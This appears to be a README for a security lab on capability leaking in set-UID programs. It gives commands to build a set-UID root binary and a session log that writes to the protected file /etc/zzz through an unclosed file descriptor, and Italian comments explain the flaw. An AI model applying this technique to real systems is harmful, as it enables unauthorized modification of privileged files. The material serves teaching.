# capability-leak-attack
This is a linux bash capability leak attack whit C program.

CAPABILITY LEAKING of set-UID

You need to compile cap_leaking.c
`gcc -o cap_leaking cap_leaking.c`

change the user owner and set the set-UID in the cap_leaking file
`sudo chown root cap_leaking`
`sudo chmod 4755 cap_leaking`


Now if I run the program it print the number of file descriptor.
`fd is 3`
`Real user id is 1000`
`Effective user id is 1000`
`$whoami`
`$seed`
`$echo bbbbbb >&3`
`$cat /etc/zzz`
`$this is a very important file`
` bbbbbb`



######
il problema qua e' che non e' stato chiuso il file descriptor del file 
e la shell che apro ha gli stessi privilegi
il file descriptor e' indicato con il numero 3
normalemente non sono abilitato a scrivere nel file zzz ma quando abilito il 4755 chmod allora apro la shell con gli stessi privilegi di 4755
#####
